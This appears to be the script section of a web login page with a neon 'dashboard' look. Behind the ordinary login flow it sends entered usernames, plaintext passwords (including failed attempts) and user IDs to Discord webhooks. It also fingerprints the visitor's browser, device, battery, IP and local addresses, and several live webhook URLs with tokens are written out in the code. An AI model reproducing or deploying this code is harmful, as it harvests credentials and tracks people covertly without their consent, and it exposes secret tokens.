            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed (Eff.)", value: nav.connection?.effectiveType || "Unknown", inline: true },
            // Additional Logging Information
            { name: "Referrer URL", value: document.referrer || "None", inline: false },
            { name: "Geolocation Access Granted", value: "Undetected", inline: true },
            { name: "WebRTC Support", value: navigator.mediaDevices?.getUserMedia ? "Supported" : "Not Supported", inline: true },
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: data.screenResolution, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: data.pixelDensity?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Device Vendor", value: data.vendor, inline: true },
            { name: "Device Language", value: nav.language || "Unknown", inline: true },
            // Additional Logging Information
            { name: "CPU Architecture", value: (navigator.oscpu || "Unavailable").replace('(', '').replace(')', ''), inline: false }, // General architecture
            { name: "Hardware Concurrency (Threads)", value: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} threads` : "Unavailable", inline: true },
            { name: "Device Accelerometer/Gyroscope Support", value: ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window) ? "Detected" : "Unavailable", inline: true },
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed (Network)", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true },
            // Additional Logging Information
            { name: "Cellular Connection Type", value: nav.connection?.cellularType || "Not Cellular", inline: true }, // 4g, 5g, etc
            { name: "Timezone", value: data.timezone, inline: true },
            { name: "DNS Servers (Proxied)", value: "Undetected / N/A", inline: false }, // Cannot directly get DNS from JS
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        // Assume data will also contain properties about dashboard stats or other user actions, if passed to it
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time (ISO)", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration (seconds)", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks (Est.)", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time (seconds)", value: data.idleTime || "0s", inline: true },
            { name: "Active Time (milliseconds)", value: data.activeTime?.toFixed(2) || "Unknown", inline: true }, // Using performance.now() for this
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true },
            // Additional Logging Information
            { name: "Total UI Elements Interaction", value: (data.numberOfClicks + data.numberOfFormSubmissions + stats.getStats().buttonsPressed + stats.getStats().togglesUsed).toString() || "N/A", inline: true }, // Example aggregate stat
            { name: "Application Runtime Environment", value: "Browser Webpage", inline: true },
          ]
        };
      }


      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          activityLogger.log('Login Attempt', 'Missing Fields', 'error');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt *before* checking credentials in case user doesn't exist
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );
        stats.trackAction('button', 'submitLogin');


        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found or ID incorrect.');
          loginHistory.addEntry(username, userID, 'Failed - User Not Found/ID');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          loginHistory.addEntry(username, userID, 'Failed - Incorrect Password');
          return;
        }

        // Correct login
        attempts = 3; // Reset attempts on successful login
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'var(--neon-glow-color-light)';
        loginBox.style.boxShadow = 'var(--dashboard-glow)';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);
        loginHistory.addEntry(username, userID, 'Success');

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);
        activityLogger.log('Login Successful', `User: ${user.name}`);


        // --- Dashboard Loading Animation & Transition ---
        const loginPageContainer = document.getElementById('loginPageContainer');
        const dashboardLoadingScreen = document.getElementById('dashboardLoadingScreen');
        const dashboardElement = document.getElementById('dashboard');
        const dashboardLoadingCube = document.getElementById('dashboardLoadingCube');
        const dashboardLoadingCodeText = document.getElementById('dashboardLoadingCodeText');
        const dashboardAlert = document.getElementById('dashboardAlert');

        loginPageContainer.style.display = 'none'; // Hide login page
        dashboardLoadingScreen.style.opacity = '1';
        dashboardLoadingScreen.style.pointerEvents = 'all'; // Enable interaction during loading
        document.body.className = 'dashboard-body'; // Switch to dashboard body style

        // Animate loading cube on dashboard loading screen
        dashboardLoadingCube.style.animation = 'rotateCube 2s infinite linear, pulsateGlow 1.5s infinite alternate';
        
        // Mock loading code animation
        const codeSnippets = [
            'Verifying system integrity...',
            'Establishing secure channel...',
            'Initializing core modules...',
            'Authenticating user credentials...',
            'Loading user profile...',
            'Compiling dashboard assets...',
            'Applying user settings...',
            'Establishing API connections...',
            'Data synchronization complete...',
            'Loading complete.'
        ];
        let snippetIndex = 0;

        const animateCodeText = () => {
            dashboardLoadingCodeText.textContent = codeSnippets[snippetIndex];
            snippetIndex = (snippetIndex + 1) % codeSnippets.length;
        };
        const codeAnimationInterval = setInterval(animateCodeText, 800);


        setTimeout(() => {
            clearInterval(codeAnimationInterval);
            dashboardLoadingCodeText.textContent = 'Loading complete.'; // Final message

            // Fade out dashboard loading screen
            dashboardLoadingScreen.style.opacity = '0';
            dashboardLoadingScreen.style.pointerEvents = 'none'; // Disable interaction

            setTimeout(() => {
                dashboardLoadingScreen.style.display = 'none';
                dashboardElement.style.display = 'block';
                dashboardElement.style.opacity = '1'; // Show dashboard
                document.body.style.overflow = 'auto'; // Re-enable scroll if needed
                
                dashboard.user = user; // Set global user for dashboard
                dashboard.init(); // Initialize dashboard functionality

                // Set user name in alert and show
                document.getElementById('loggedInUser').textContent = user.name || user.username;
                document.getElementById('loggedInID').textContent = userID;
                document.getElementById('alertUserName').textContent = user.name || user.username; // For alert

                if (!dashboard.alertShown && dashboard.settings.get('enableAlerts')) {
                    showAlert(`Welcome back, ${user.name || user.username}!`, 'success', 4000);
                    dashboard.alertShown = true;
                }

                activityLogger.log('Dashboard Loaded', `User: ${user.name}`);
            }, 1000); // Wait for fade out
        }, 5000); // Dashboard loading simulation time

      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
          loginHistory.addEntry(username, userID, 'Attempts Exceeded');
          activityLogger.log('Max Login Attempts', `Blocked user: ${username}`, 'error');
        } else {
          flashRedOutline(2, 400);
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "üîî Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJTskeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "‚úÖ Reset Code Accepted" : "‚ùå Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHfSaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 3;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          activityLogger.log('Reset Counter Successful', 'Attempts restored to 3');
          loginHistory.addEntry(username, userID, 'Counter Reset');
        } else {
          alert('Incorrect reset code.');
          activityLogger.log('Reset Counter Failed', 'Incorrect code', 'error');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
